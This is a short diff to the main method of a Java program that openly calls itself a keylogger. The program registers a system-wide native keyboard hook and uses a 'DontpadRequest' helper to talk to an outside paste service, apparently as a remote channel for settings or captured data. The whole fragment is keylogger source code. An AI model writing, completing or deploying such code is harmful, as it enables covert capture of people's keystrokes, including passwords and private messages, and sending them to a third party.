@@ -9,9 +9,9 @@ public class Main {
 	
 	public static void main(String[] args) throws Exception {
 		
-		DontpadRequest.sendPost("teste");
+		System.out.println("starting keylogger...");
 		
-		ManageService service = new ManageService();
+		ManageService service = new ManageService(DontpadRequest.sendGet());
 		
 		try {
 			GlobalScreen.registerNativeHook();
